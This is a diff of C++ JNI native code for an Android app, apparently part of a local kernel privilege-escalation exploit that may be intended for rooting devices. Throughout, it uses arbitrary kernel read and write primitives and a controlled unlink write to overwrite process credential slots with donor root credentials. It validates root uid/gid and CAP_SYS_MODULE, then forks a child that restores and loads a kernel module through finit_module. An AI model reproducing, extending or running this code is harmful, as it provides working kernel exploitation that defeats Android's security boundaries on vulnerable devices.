@@ -10099,11 +13841,10 @@ Java_com_vandam_prism_NativeBridge_completeRawUnlink(
     }
     bool validation_deferred = !g_direct_security_repair && !read_back &&
             (victim == 1 || victim == 2);
-    bool release_valid = released == expected_before - 1;
+    int expected_release = batch_retained ? 0 : expected_before - 1;
+    bool release_valid = released == expected_release;
     std::uint64_t target_effective = UINT64_MAX;
-    bool target_effective_read = g_credential_target_external &&
-            reliable_read64(g_arb_cred_address + 20,
-                            &target_effective);
+    bool target_effective_read = false;
     bool direct_sequence_valid = true;
     bool collateral_read = false;
     bool collateral_valid = true;
@@ -10140,7 +13881,9 @@ Java_com_vandam_prism_NativeBridge_completeRawUnlink(
         std::uint64_t expected_collateral = completion_terminal_label
                 ? address
                 : completion_repair || completion_quarantine ? 0 : address;
-        collateral_read = completion_terminal_label
+        collateral_read = completion_repair
+                ? (collateral = value, read_back)
+                : expected_collateral != 0
                 ? reliable_read64(collateral_address, &collateral)
                 : reliable_read64_allow_zero(
                         collateral_address, zero_control_address,
@@ -10163,7 +13906,8 @@ Java_com_vandam_prism_NativeBridge_completeRawUnlink(
                             g_terminal_memfd_inode_security_original
                     : module_label == g_terminal_vendor_inode_security;
             final_slots_valid = slots_read &&
-                    final_real_cred == g_direct_cred_value &&
+                    final_real_cred == (g_direct_subjective_only
+                            ? g_private_cred : g_direct_cred_value) &&
                     final_cred == g_direct_cred_value &&
                     module_label_read && expected_module_label;
         } else if (g_direct_write_step >= 4) {
@@ -10219,13 +13963,14 @@ Java_com_vandam_prism_NativeBridge_completeRawUnlink(
                  attempt < 16 && !final_donor_valid; ++attempt) {
                 ++final_donor_attempts;
                 std::uint64_t final_repair = UINT64_MAX;
-                final_donor_live_valid = validate_live_security_target();
+                final_donor_live_valid =
+                        validate_live_security_target(true);
                 final_donor_live_stage = g_live_security_target_stage;
                 final_donor_live_after_valid = false;
                 final_donor_live_after_stage = 0;
                 final_donor_snapshot_stage = 0;
                 final_donor_snapshot_valid = final_donor_live_valid &&
-                        validate_zero_root_cred_snapshot(
+                        validate_zero_root_cred_snapshot_fast(
                                 g_security_target_task,
                                 g_security_target_cred,
                                 g_security_target_real_cred_slot,
@@ -10237,7 +13982,7 @@ Java_com_vandam_prism_NativeBridge_completeRawUnlink(
                 }
                 if (final_donor_snapshot_valid) {
                     final_donor_live_after_valid =
-                            validate_live_security_target();
+                            validate_live_security_target(true);
                     final_donor_live_after_stage =
                             g_live_security_target_stage;
                 }
@@ -10281,6 +14026,14 @@ Java_com_vandam_prism_NativeBridge_completeRawUnlink(
                     ? geteuid() == 0 && getegid() == 0
                     : last_write && getuid() == 0 && getgid() == 0 &&
                             geteuid() == 0 && getegid() == 0);
+    bool reusable_pool_retired = true;
+    if (pass && g_direct_terminal_cleanup && completion_terminal_label &&
+        g_direct_write_step == 6) {
+        std::lock_guard<std::mutex> lock(g_fake_control_mutex);
+        reusable_pool_retired =
+                shutdown_reusable_fake_control_pool_locked();
+        pass = reusable_pool_retired;
+    }
     int gid_result = -1;
     int uid_result = -1;
     if (pass && g_direct_security_repair) {
@@ -10297,7 +14050,7 @@ Java_com_vandam_prism_NativeBridge_completeRawUnlink(
     }
     bool acknowledged = record_controlled_unlink(pass);
     pass = pass && acknowledged;
-    char state[1664];
+    char state[1728];
     std::snprintf(state, sizeof(state),
             "status=%s stage=null-write-complete victim=%d worker=%d"
             " target=0x%" PRIx64 " value=0x%" PRIx64
@@ -10330,9 +14083,11 @@ Java_com_vandam_prism_NativeBridge_completeRawUnlink(
             " final_donor_zero_address=0x%" PRIx64
             " final_donor_zero_rc=%d"
             " final_donor_zero_errno=%d"
-            " released=%d expected_release=%d poison=%d"
+            " released=%d expected_release=%d release_us=%" PRId64
+            " poison=%d"
             " internal_write_misses=%d used_victims=%d"
             " successful_writes=%d"
+            " reusable_pool_retired=%d"
             " setresuid=%d setresgid=%d normalise_deferred=%d"
             " uid=%u euid=%u gid=%u egid=%u",
             pass ? "pass" : "fail", victim, worker, address, value,
@@ -10365,9 +14120,11 @@ Java_com_vandam_prism_NativeBridge_completeRawUnlink(
             g_zero_read_address,
             g_zero_read_result,
             g_zero_read_errno,
-            released, expected_before - 1, poisoned_control_count(),
+            released, expected_release, g_fake_control_release_microseconds,
+            poisoned_control_count(),
             g_internal_write_misses, g_write_victims_used,
             g_write_successes,
+            reusable_pool_retired ? 1 : 0,
             uid_result, gid_result, pass && last_write ? 1 : 0,
             static_cast<unsigned>(getuid()),
             static_cast<unsigned>(geteuid()),
@@ -10461,12 +14218,17 @@ Java_com_vandam_prism_NativeBridge_adoptCredentialTarget(
     g_direct_security_repair = false;
     g_direct_cred_quarantine = false;
     g_direct_terminal_cleanup = false;
+    g_direct_subjective_only = false;
     g_direct_write_step = 0;
     g_internal_write_misses = 0;
     g_write_victims_used = 0;
     g_write_successes = 0;
     g_null_write_armed = false;
     g_null_write_armed_victim = -1;
+    g_null_write_batch_armed.clear();
+    g_null_write_batch_selected.clear();
+    g_null_write_batch_prepared = false;
+    g_null_write_batch_next_victim = 1;
     g_terminal_cleanup_result.clear();
     g_direct_init_real_cred_slot = 0;
     g_direct_init_cred_slot = 0;
@@ -10568,11 +14330,11 @@ Java_com_vandam_prism_NativeBridge_adoptCredentialTarget(
                     &expected_user_ns) &&
             kernel_address(expected_user_ns);
     bool first_snapshot_read = ids_valid && user_ns_valid &&
-            read_credential_snapshot(
+            read_credential_snapshot_fast(
                     target_cred, target_task + kTaskCredOffset,
                     first_snapshot, &first_sid);
     bool second_snapshot_read = first_snapshot_read &&
-            read_credential_snapshot(
+            read_credential_snapshot_fast(
                     target_cred, target_task + kTaskCredOffset,
                     second_snapshot, &second_sid);
     bool snapshots_equal = second_snapshot_read &&
@@ -10686,7 +14448,7 @@ Java_com_vandam_prism_NativeBridge_prepareDirectInitTarget(
         JNIEnv* environment, jclass) {
     std::uint64_t real_cred_slot = 0;
     std::uint64_t cred_slot = 0;
-    bool slots = find_cred_slots(
+    bool slots = validate_fixed_cred_slots(
             g_credential_target_task, g_arb_cred_address,
             &real_cred_slot, &cred_slot);
     std::uint64_t kernel_base = kKernelLinkBase + g_profile_kernel_slide;
@@ -10738,8 +14500,7 @@ Java_com_vandam_prism_NativeBridge_adoptSecurityTarget(
                     g_cached_current_binder_proc,
                     g_security_target_handle)
             : find_security_target_binder_proc();
-    std::uint64_t repeated_target_proc = g_security_target_handle > 0
-            ? target_proc : find_security_target_binder_proc();
+    bool repeated_target_proc = security_target_proc_is_live(target_proc);
     std::uint32_t target_pid = 0;
     std::uint64_t target_cred = 0;
     std::uint64_t target_real_cred = 0;
@@ -10749,7 +14510,7 @@ Java_com_vandam_prism_NativeBridge_adoptSecurityTarget(
     std::uint32_t sid = 0;
     bool pass = kernel_pointer(g_cached_current_binder_proc) &&
             kernel_pointer(target_proc) &&
-            target_proc == repeated_target_proc &&
+            repeated_target_proc &&
             arbitrary_read32(target_proc + 64, &target_pid) &&
             target_pid == static_cast<std::uint32_t>(g_security_target_pid) &&
             reliable_read64(target_proc + 72, &target_task) &&
@@ -10780,7 +14541,7 @@ Java_com_vandam_prism_NativeBridge_adoptSecurityTarget(
             target_cred + 8, &cred_repair);
     std::uint64_t real_cred_slot = 0;
     std::uint64_t cred_slot = 0;
-    bool slots = pass && find_cred_slots(
+    bool slots = pass && validate_fixed_cred_slots(
             target_task, target_cred, &real_cred_slot, &cred_slot);
     if (g_security_target_handle <= 0) {
         slots = slots && real_cred_slot == target_task + 0x778 &&
@@ -11312,13 +15073,13 @@ Java_com_vandam_prism_NativeBridge_prepareDirectSecurityTarget(
         }
     }
     bool live_target = !repair ||
-            (cap_seed_valid && validate_live_security_target());
+            (cap_seed_valid && validate_live_security_target(true));
     for (; repair && live_target && valid_snapshots < 2 &&
          repair_attempts < 32;
          ++repair_attempts) {
         std::uint64_t snapshot_repair = UINT64_MAX;
         bool snapshot = cached_donor_slots &&
-                validate_zero_root_cred_snapshot(
+                validate_zero_root_cred_snapshot_fast(
                         g_security_target_task,
                         g_security_target_cred,
                         donor_real_cred_slot, donor_cred_slot,
@@ -11342,7 +15103,7 @@ Java_com_vandam_prism_NativeBridge_prepareDirectSecurityTarget(
     repair_snapshot = valid_snapshots == 2;
     std::uint64_t real_cred_slot = 0;
     std::uint64_t cred_slot = 0;
-    bool slots = repair_snapshot && find_cred_slots(
+    bool slots = repair_snapshot && validate_fixed_cred_slots(
             g_credential_target_task, g_arb_cred_address,
             &real_cred_slot, &cred_slot);
     bool repair_valid = !repair ||
@@ -11363,6 +15124,7 @@ Java_com_vandam_prism_NativeBridge_prepareDirectSecurityTarget(
         g_direct_security_repair = repair;
         g_direct_cred_quarantine = quarantine;
         g_direct_terminal_cleanup = clean;
+        g_direct_subjective_only = false;
         g_direct_write_step = repair ? 1 : 0;
         g_direct_init_real_cred_slot = real_cred_slot;
         g_direct_init_cred_slot = cred_slot;
@@ -11546,8 +15308,10 @@ Java_com_vandam_prism_NativeBridge_prepareCommandRootWatchdog(
         g_helper_waiting_fd = open(
                 "/data/local/tmp/light-side-normalise.waiting",
                 O_WRONLY | O_CREAT | O_TRUNC | O_CLOEXEC, 0600);
-        g_command_watchdog_output_fd = fcntl(
-                STDOUT_FILENO, F_DUPFD_CLOEXEC, 3);
+        g_command_watchdog_output_fd = open(
+                "/data/local/tmp/lp3-native-watchdog.trace",
+                O_WRONLY | O_CREAT | O_TRUNC | O_APPEND | O_CLOEXEC,
+                0600);
     }
     bool prepared = nonce_valid && shell && g_helper_waiting_fd >= 0 &&
             g_command_watchdog_output_fd >= 0;
@@ -11570,12 +15334,50 @@ Java_com_vandam_prism_NativeBridge_prepareCommandRootWatchdog(
     g_command_watchdog_ready.store(0, std::memory_order_release);
     g_command_watchdog_normalise.store(0, std::memory_order_release);
     g_command_watchdog_exit.store(0, std::memory_order_release);
+    g_command_watchdog_heartbeat.store(0, std::memory_order_release);
     g_command_watchdog_tid.store(-1, std::memory_order_release);
     g_resukisu_action.store(0, std::memory_order_release);
     g_resukisu_exit.store(-1, std::memory_order_release);
     g_resukisu_errno.store(0, std::memory_order_release);
     g_resukisu_manager_uid.store(-1, std::memory_order_release);
     g_resukisu_kernel_base.store(0, std::memory_order_release);
+    g_resukisu_child_pid.store(-1, std::memory_order_release);
+    g_resukisu_receipt_stage.store(0, std::memory_order_release);
+    g_resukisu_receipt_bytes.store(0, std::memory_order_release);
+    g_resukisu_receipt_detail.store(0, std::memory_order_release);
+    g_resukisu_spawn_stage.store(0, std::memory_order_release);
+    g_resukisu_spawn_error.store(0, std::memory_order_release);
+    g_action_loader_request.store(0, std::memory_order_release);
+    g_action_loader_gate.store(0, std::memory_order_release);
+    g_action_loader_relocation.store(-1, std::memory_order_release);
+    g_action_loader_stage.store(-1, std::memory_order_release);
+    g_action_loader_result.store(-1, std::memory_order_release);
+    __atomic_store_n(&g_resukisu_raw_pidfd, -1, __ATOMIC_RELEASE);
+    g_action_daemon_spawn_stage.store(0, std::memory_order_release);
+    g_action_daemon_pid.store(-1, std::memory_order_release);
+    g_action_daemon_spawner_created = false;
+    int stale_diagnostic_fd = g_resukisu_diagnostic_fd.exchange(
+            -1, std::memory_order_acq_rel);
+    if (stale_diagnostic_fd >= 0) {
+        close(stale_diagnostic_fd);
+    }
+    int stale_completion_fd = g_resukisu_completion_fd.exchange(
+            -1, std::memory_order_acq_rel);
+    if (stale_completion_fd >= 0) {
+        close(stale_completion_fd);
+    }
+    int stale_registration_read_fd =
+            g_resukisu_registration_read_fd.exchange(
+            -1, std::memory_order_acq_rel);
+    if (stale_registration_read_fd >= 0) {
+        close(stale_registration_read_fd);
+    }
+    int stale_registration_write_fd =
+            g_resukisu_registration_write_fd.exchange(
+                    -1, std::memory_order_acq_rel);
+    if (stale_registration_write_fd >= 0) {
+        close(stale_registration_write_fd);
+    }
     if (g_resukisu_fd >= 0) {
         close(g_resukisu_fd);
         g_resukisu_fd = -1;
@@ -11583,6 +15385,14 @@ Java_com_vandam_prism_NativeBridge_prepareCommandRootWatchdog(
     if (g_resukisu_module_fd >= 0) {
         close(g_resukisu_module_fd);
         g_resukisu_module_fd = -1;
+    }
+    if (g_resukisu_loader_fd >= 0) {
+        close(g_resukisu_loader_fd);
+        g_resukisu_loader_fd = -1;
+    }
+    if (g_action_supervisor_fd >= 0) {
+        close(g_action_supervisor_fd);
+        g_action_supervisor_fd = -1;
     }
     g_ctlbuf_donor_freeze_request.store(0, std::memory_order_release);
     g_ctlbuf_donor_pid.store(-1, std::memory_order_release);
@@ -11599,6 +15409,8 @@ Java_com_vandam_prism_NativeBridge_prepareCommandRootWatchdog(
     g_ctlbuf_rescue_errno.store(0, std::memory_order_relaxed);
     g_ctlbuf_rescue_detail.store(0, std::memory_order_relaxed);
     g_ctlbuf_rescue_stage.store(0, std::memory_order_release);
+    g_ctlbuf_rescue_load_request.store(0, std::memory_order_release);
+    g_ctlbuf_rescue_load_result.store(0, std::memory_order_release);
     g_command_watchdog_thread_created = false;
     g_command_watchdog_leader_identity = CommandRootIdentity {};
     g_command_watchdog_identity = CommandRootIdentity {};
@@ -11613,6 +15425,7 @@ Java_com_vandam_prism_NativeBridge_prepareCommandRootWatchdog(
         g_ctlbuf_rescue_plan_ready.store(0, std::memory_order_release);
         g_ctlbuf_rescue_module_loaded = false;
         g_ctlbuf_rescue_module_unloaded = false;
+        g_ctlbuf_rescue_subjective_only = false;
     }
     {
         std::lock_guard<std::mutex> lock(g_ctlbuf_finalise_mutex);
@@ -11636,6 +15449,74 @@ Java_com_vandam_prism_NativeBridge_prepareCommandRootWatchdog(
             identity.tid == identity.pid ? 1 : 0, shell ? 1 : 0,
             g_helper_waiting_fd >= 0 ? 1 : 0,
             g_command_watchdog_output_fd >= 0 ? 1 : 0);
+    return environment->NewStringUTF(state);
+}
+
+extern "C" JNIEXPORT jstring JNICALL
+Java_com_vandam_prism_NativeBridge_prepareProbeShellCredential(
+        JNIEnv* environment, jclass) {
+    bool leader = syscall(SYS_gettid) == getpid();
+    bool shell_before = getuid() == 2000 && geteuid() == 2000 &&
+            getgid() == 2000 && getegid() == 2000;
+    errno = 0;
+    int securebits_before = leader && shell_before
+            ? static_cast<int>(syscall(
+                    SYS_prctl, PR_GET_SECUREBITS, 0, 0, 0, 0)) : -1;
+    int securebits_before_errno = securebits_before >= 0 ? 0 : errno;
+    errno = 0;
+    int ambient_before = securebits_before >= 0
+            ? static_cast<int>(syscall(
+                    SYS_prctl, PR_CAP_AMBIENT,
+                    PR_CAP_AMBIENT_IS_SET, CAP_CHOWN, 0, 0)) : -1;
+    int ambient_before_errno = ambient_before >= 0 ? 0 : errno;
+    errno = 0;
+    int ambient_lower = ambient_before == 0
+            ? static_cast<int>(syscall(
+                    SYS_prctl, PR_CAP_AMBIENT,
+                    PR_CAP_AMBIENT_LOWER, CAP_CHOWN, 0, 0)) : -1;
+    int ambient_lower_errno = ambient_lower == 0 ? 0 : errno;
+    errno = 0;
+    int credential_result = ambient_lower == 0
+            ? static_cast<int>(syscall(
+                    SYS_setresuid, 2000, 2000, 2000)) : -1;
+    int credential_errno = credential_result == 0 ? 0 : errno;
+    errno = 0;
+    int securebits_after = credential_result == 0
+            ? static_cast<int>(syscall(
+                    SYS_prctl, PR_GET_SECUREBITS, 0, 0, 0, 0)) : -1;
+    int securebits_after_errno = securebits_after >= 0 ? 0 : errno;
+    errno = 0;
+    int ambient_after = securebits_after >= 0
+            ? static_cast<int>(syscall(
+                    SYS_prctl, PR_CAP_AMBIENT,
+                    PR_CAP_AMBIENT_IS_SET, CAP_CHOWN, 0, 0)) : -1;
+    int ambient_after_errno = ambient_after >= 0 ? 0 : errno;
+    bool shell_after = getuid() == 2000 && geteuid() == 2000 &&
+            getgid() == 2000 && getegid() == 2000;
+    constexpr int kExpectedShellSecurebits = 47;
+    bool pass = leader && shell_before &&
+            securebits_before == kExpectedShellSecurebits &&
+            ambient_before == 0 && ambient_lower == 0 &&
+            credential_result == 0 &&
+            securebits_after == securebits_before && ambient_after == 0 &&
+            shell_after;
+    char state[512];
+    std::snprintf(state, sizeof(state),
+            "status=%s stage=probe-shell-credential leader=%d"
+            " pid=%d tid=%d securebits_before=%d"
+            " securebits_before_errno=%d credential=%d"
+            " credential_errno=%d ambient_before=%d"
+            " ambient_before_errno=%d ambient_lower=%d"
+            " ambient_lower_errno=%d securebits_after=%d"
+            " securebits_after_errno=%d ambient_after=%d"
+            " ambient_after_errno=%d shell_before=%d shell_after=%d",
+            pass ? "pass" : "fail", leader ? 1 : 0, getpid(),
+            static_cast<int>(syscall(SYS_gettid)), securebits_before,
+            securebits_before_errno, credential_result, credential_errno,
+            ambient_before, ambient_before_errno, ambient_lower,
+            ambient_lower_errno, securebits_after, securebits_after_errno,
+            ambient_after, ambient_after_errno,
+            shell_before ? 1 : 0, shell_after ? 1 : 0);
     return environment->NewStringUTF(state);
 }
 
@@ -11784,10 +15665,11 @@ Java_com_vandam_prism_NativeBridge_createPrivateShellCredential(
 bool parse_ctlbuf_list(const std::string& value, bool tids) {
     std::size_t cursor = 0;
     std::set<std::uint64_t> unique;
-    for (int index = 0; index < 7; ++index) {
+    for (int index = 0; index < kCtlbufRepairCount; ++index) {
         std::size_t end = value.find(',', cursor);
-        if ((index < 6 && end == std::string::npos) ||
-            (index == 6 && end != std::string::npos)) {
+        if ((index < kCtlbufRepairCount - 1 && end == std::string::npos) ||
+            (index == kCtlbufRepairCount - 1 &&
+             end != std::string::npos)) {
             return false;
         }
         if (end == std::string::npos) {
@@ -11853,7 +15735,7 @@ Java_com_vandam_prism_NativeBridge_installCtlbufRescuePlan(
             "status=pass stage=ctlbuf-rescue-plan nonce=" +
             std::string(g_command_watchdog_nonce) +
             " module_sha256="
-            "2b4e520b65f252c1c7a51c303f8bc228663f6804cbca00f2ebc6005c9a9f26f8"
+            "ff4e063cc09b926c09b55a777705d386734a1d1db6428d3e41081486c07bbb86"
             " params=";
     bool exact_prefix = plan.size() > prefix.size() &&
             plan.size() < 3072 && plan.compare(0, prefix.size(), prefix) == 0 &&
@@ -12068,6 +15950,7 @@ Java_com_vandam_prism_NativeBridge_installCtlbufRescuePlan(
             g_ctlbuf_rescue_plan = plan;
             g_ctlbuf_rescue_parameters = module_parameters;
             g_ctlbuf_rescue_module_fd = duplicate_fd;
+            g_ctlbuf_rescue_subjective_only = true;
             g_ctlbuf_finalise_plan = parsed_finalise_plan;
             g_ctlbuf_resume_cookie_hi = resume_cookie_hi;
             g_ctlbuf_resume_cookie_lo = resume_cookie_lo;
@@ -12109,14 +15992,15 @@ std::string read_bounded_text(const char* path, std::size_t limit) {
 }
 
 bool validate_ctlbuf_repair_status(const std::string& status) {
-    std::string prefix = "status=pass count=7";
+    std::string prefix = "status=pass count=" +
+            std::to_string(kCtlbufRepairCount);
     if (status.compare(0, prefix.size(), prefix) != 0) {
         return false;
     }
     std::size_t cursor = prefix.size();
     std::set<std::uint64_t> slots;
     std::set<std::uint64_t> replacements;
-    for (int index = 0; index < 7; ++index) {
+    for (int index = 0; index < kCtlbufRepairCount; ++index) {
         std::string item_prefix = " e" + std::to_string(index) + "=";
         if (status.compare(cursor, item_prefix.size(), item_prefix) != 0) {
             return false;
@@ -12428,9 +16312,10 @@ std::string format_ctlbuf_donor_resume_status(
     return std::string(status, static_cast<std::size_t>(length));
 }
 
-bool execute_ctlbuf_rescue() {
+bool load_ctlbuf_rescue_module() {
     std::string parameters;
     int module_fd = -1;
+    write_ctlbuf_rescue_stage(14, "plan-lock-enter", 0, 0, 0);
     {
         std::lock_guard<std::mutex> lock(g_ctlbuf_rescue_plan_mutex);
         if (g_ctlbuf_rescue_plan_ready.load(std::memory_order_acquire) != 1 ||
@@ -12441,46 +16326,179 @@ bool execute_ctlbuf_rescue() {
         parameters = g_ctlbuf_rescue_parameters;
         module_fd = g_ctlbuf_rescue_module_fd;
     }
-    std::string context = read_bounded_text(
-            "/proc/self/attr/current", 64);
+    write_ctlbuf_rescue_stage(15, "plan-lock-complete", 0, 0, module_fd);
+    std::string preloaded_status = read_bounded_text(
+            "/sys/module/lp3_ctlbuf_rescue/parameters/repair_status", 2048);
+    std::string inode_restore_status = read_bounded_text(
+            "/sys/module/lp3_ctlbuf_rescue/parameters/"
+            "inode_restore_request", 16);
+    bool preloaded = validate_ctlbuf_repair_status(preloaded_status) &&
+            inode_restore_status == "1";
+    write_ctlbuf_rescue_stage(
+            20, "module-preloaded", preloaded ? 0 : -1,
+            preloaded ? 0 : ENOENT,
+            static_cast<int>(preloaded_status.size()));
+    if (preloaded) {
+        g_ctlbuf_rescue_module_loaded = true;
+        return true;
+    }
     CommandRootIdentity identity;
     errno = 0;
     int seccomp = prctl(PR_GET_SECCOMP, 0, 0, 0, 0);
     int seccomp_errno = seccomp >= 0 ? 0 : errno;
     bool identity_read = read_command_root_identity(&identity);
     int gate_bits =
-            (context == "u:r:ueventd:s0" ? 2 : 0) |
             (seccomp == 0 ? 4 : 0) |
             (identity_read ? 8 : 0) |
             (identity_read && identity.pid == getpid() &&
-                    identity.tid == getpid() ? 16 : 0) |
+                    identity.tid == g_command_watchdog_tid.load(
+                            std::memory_order_acquire) &&
+                    identity.tid != identity.pid ? 16 : 0) |
             (identity_read && command_identity_is_root(identity) ? 32 : 0) |
             (identity_read &&
                     (identity.effective_caps &
                      (UINT64_C(1) << CAP_SYS_MODULE)) != 0 ? 64 : 0);
-    bool gates = gate_bits == 126;
+    bool gates = gate_bits == 124;
     write_ctlbuf_rescue_stage(
             2, "gates", gates ? 0 : -1, seccomp_errno, gate_bits);
-    char fd_path[64];
-    int path_length = std::snprintf(
-            fd_path, sizeof(fd_path), "/proc/self/fd/%d", module_fd);
+    if (!gates) {
+        return false;
+    }
     errno = 0;
-    int reopened = gates && path_length > 0 &&
-            path_length < static_cast<int>(sizeof(fd_path))
-            ? open(fd_path, O_RDONLY | O_CLOEXEC) : -1;
+    int reopened = fcntl(module_fd, F_DUPFD_CLOEXEC, 3);
     int reopen_errno = reopened >= 0 ? 0 : errno;
     write_ctlbuf_rescue_stage(
-            3, "reopen", reopened >= 0 ? 0 : -1,
+            3, "duplicate", reopened >= 0 ? 0 : -1,
             reopen_errno, reopened);
     if (reopened < 0) {
         return false;
     }
+    char module_path[64];
+    int module_path_length = std::snprintf(
+            module_path, sizeof(module_path), "/proc/self/fd/%d", reopened);
+    if (module_path_length <= 0 ||
+        module_path_length >= static_cast<int>(sizeof(module_path))) {
+        close(reopened);
+        write_ctlbuf_rescue_stage(3, "module-path", -1, EOVERFLOW, reopened);
+        return false;
+    }
     write_ctlbuf_rescue_stage(4, "module-load-start", 0, 0, reopened);
+    struct ModuleLoadResult {
+        int restore_result;
+        int restore_error;
+        int result;
+        int error;
+        int close_result;
+    } child_result {-1, EPROTO, -1, EPROTO, -1};
+    int result_pipe[2] {-1, -1};
     errno = 0;
-    int load_result = static_cast<int>(syscall(
-            SYS_finit_module, reopened, parameters.c_str(), 0));
-    int load_errno = load_result == 0 ? 0 : errno;
+    int pipe_result = pipe2(result_pipe, O_CLOEXEC);
+    int pipe_errno = pipe_result == 0 ? 0 : errno;
+    errno = 0;
+    pid_t child = pipe_result == 0 ? fork() : -1;
+    int fork_errno = child >= 0 ? 0 : errno;
+    if (child == 0) {
+        close(result_pipe[0]);
+        struct stat backup_stat {};
+        bool restored = g_resukisu_rescue_backup_fd >= 0 &&
+                fstat(g_resukisu_rescue_backup_fd, &backup_stat) == 0 &&
+                S_ISREG(backup_stat.st_mode) &&
+                backup_stat.st_size == kReSukiModuleSize &&
+                ftruncate(reopened, kReSukiModuleSize) == 0;
+        std::array<std::uint8_t, 64 * 1024> source {};
+        std::array<std::uint8_t, 64 * 1024> readback {};
+        for (off_t offset = 0; restored && offset < kReSukiModuleSize;) {
+            std::size_t requested = static_cast<std::size_t>(
+                    std::min<off_t>(source.size(),
+                                    kReSukiModuleSize - offset));
+            ssize_t source_count = pread(
+                    g_resukisu_rescue_backup_fd, source.data(),
+                    requested, offset);
+            ssize_t write_count = source_count > 0
+                    ? pwrite(reopened, source.data(),
+                             static_cast<std::size_t>(source_count), offset)
+                    : -1;
+            ssize_t readback_count = write_count > 0
+                    ? pread(reopened, readback.data(),
+                            static_cast<std::size_t>(write_count), offset)
+                    : -1;
+            restored = source_count == static_cast<ssize_t>(requested) &&
+                    write_count == source_count &&
+                    readback_count == source_count &&
+                    std::memcmp(source.data(), readback.data(),
+                                requested) == 0;
+            offset += restored ? source_count : 0;
+        }
+        restored = restored && fsync(reopened) == 0;
+        child_result.restore_result = restored ? 0 : -1;
+        child_result.restore_error = restored
+                ? 0 : (errno == 0 ? EIO : errno);
+        errno = 0;
+        int read_fd = restored
+                ? open(module_path, O_RDONLY | O_CLOEXEC) : -1;
+        if (!restored) {
+            child_result.result = -1;
+            child_result.error = child_result.restore_error;
+        } else if (read_fd < 0) {
+            child_result.result = -1;
+            child_result.error = errno;
+        } else {
+            errno = 0;
+            child_result.result = static_cast<int>(syscall(
+                    SYS_finit_module, read_fd, parameters.c_str(), 0));
+            child_result.error = child_result.result == 0 ? 0 : errno;
+        }
+        child_result.close_result =
+                (read_fd < 0 || close(read_fd) == 0) &&
+                        close(reopened) == 0 ? 0 : -1;
+        bool written = write_all(
+                result_pipe[1], &child_result, sizeof(child_result));
+        close(result_pipe[1]);
+        _exit(written ? 0 : 125);
+    }
+    if (result_pipe[1] >= 0) {
+        close(result_pipe[1]);
+    }
     bool close_ok = close(reopened) == 0;
+    int child_status = 0;
+    pid_t waited = -1;
+    if (child > 0) {
+        do {
+            waited = waitpid(child, &child_status, 0);
+        } while (waited < 0 && errno == EINTR);
+    }
+    std::size_t received = 0;
+    while (waited == child && result_pipe[0] >= 0 &&
+           received < sizeof(child_result)) {
+        ssize_t count = read(
+                result_pipe[0],
+                reinterpret_cast<char*>(&child_result) + received,
+                sizeof(child_result) - received);
+        if (count < 0 && errno == EINTR) {
+            continue;
+        }
+        if (count <= 0) {
+            break;
+        }
+        received += static_cast<std::size_t>(count);
+    }
+    if (result_pipe[0] >= 0) {
+        close(result_pipe[0]);
+    }
+    bool child_valid = pipe_result == 0 && child > 0 && waited == child &&
+            WIFEXITED(child_status) && WEXITSTATUS(child_status) == 0 &&
+            received == sizeof(child_result);
+    int load_result = child_valid ? child_result.result : -1;
+    int load_errno = child_valid ? child_result.error
+            : pipe_errno != 0 ? pipe_errno
+            : fork_errno != 0 ? fork_errno : ECHILD;
+    close_ok = close_ok && child_valid && child_result.close_result == 0;
+    write_ctlbuf_rescue_stage(
+            19, "module-restore",
+            child_valid ? child_result.restore_result : -1,
+            child_valid ? child_result.restore_error : ECHILD,
+            child_valid && child_result.restore_result == 0
+                    ? static_cast<int>(kReSukiModuleSize) : 0);
     write_ctlbuf_rescue_stage(
             5, "module-load", load_result, load_errno,
             close_ok ? 1 : 0);
@@ -12495,6 +16513,54 @@ bool execute_ctlbuf_rescue() {
             6, "module-status", status_valid ? 0 : -1, 0,
             static_cast<int>(status.size()));
     return status_valid;
+}
+
+bool execute_ctlbuf_rescue() {
+    CommandRootIdentity identity;
+    errno = 0;
+    int seccomp = prctl(PR_GET_SECCOMP, 0, 0, 0, 0);
+    bool leader = read_command_subjective_identity(&identity) &&
+            identity.pid == getpid() && identity.tid == getpid() &&
+            command_identity_has_root_ids(identity) && seccomp == 0;
+    int expected = 0;
+    int heartbeat_before = g_command_watchdog_heartbeat.load(
+            std::memory_order_acquire);
+    bool dispatched = leader &&
+            g_ctlbuf_rescue_load_request.compare_exchange_strong(
+                    expected, 1, std::memory_order_acq_rel);
+    write_ctlbuf_rescue_stage(
+            1, "watchdog-load-dispatch", dispatched ? 0 : -1,
+            dispatched ? 0 : (errno == 0 ? EPROTO : errno),
+            dispatched ? heartbeat_before : expected);
+    if (!dispatched) {
+        return false;
+    }
+    wake_command_watchdog(&g_ctlbuf_rescue_load_request, INT_MAX);
+    bool request_completed = wait_for_command_watchdog(
+            &g_ctlbuf_rescue_load_request, 2, 15);
+    int load_result = g_ctlbuf_rescue_load_result.load(
+            std::memory_order_acquire);
+    bool completed = request_completed && load_result == 1;
+    if (!request_completed) {
+        int watchdog_tid = g_command_watchdog_tid.load(
+                std::memory_order_acquire);
+        errno = 0;
+        int liveness = watchdog_tid > 0
+                ? static_cast<int>(syscall(
+                        SYS_tgkill, getpid(), watchdog_tid, 0)) : -1;
+        int liveness_errno = liveness == 0 ? 0 : errno;
+        write_ctlbuf_rescue_stage(
+                17, "watchdog-load-liveness", liveness, liveness_errno,
+                g_command_watchdog_heartbeat.load(
+                        std::memory_order_acquire) - heartbeat_before);
+        write_ctlbuf_rescue_stage(
+                6, "watchdog-load-result", -1, ETIMEDOUT,
+                load_result);
+    } else if (load_result != -1 && load_result != 1) {
+        write_ctlbuf_rescue_stage(
+                18, "watchdog-load-protocol", -1, EPROTO, load_result);
+    }
+    return completed;
 }
 
 bool finalise_ctlbuf_rescue() {
@@ -12676,9 +16742,9 @@ Java_com_vandam_prism_NativeBridge_awaitCredentialNormalisation(
     }
     g_ctlbuf_donor_leader_stage.store(10, std::memory_order_release);
     CommandRootIdentity root_identity;
-    bool root = read_command_root_identity(&root_identity) &&
+    bool root = read_command_subjective_identity(&root_identity) &&
             root_identity.tid == root_identity.pid &&
-            command_identity_is_root(root_identity);
+            command_identity_has_root_ids(root_identity);
     if (!root) {
         g_command_watchdog_phase.store(
                 kCommandWatchdogFailed, std::memory_order_release);
@@ -12687,6 +16753,7 @@ Java_com_vandam_prism_NativeBridge_awaitCredentialNormalisation(
     }
     g_ctlbuf_donor_leader_stage.store(20, std::memory_order_release);
     g_command_watchdog_leader_identity = root_identity;
+    g_action_daemon_spawn_stage.store(3, std::memory_order_release);
     g_command_watchdog_phase.store(
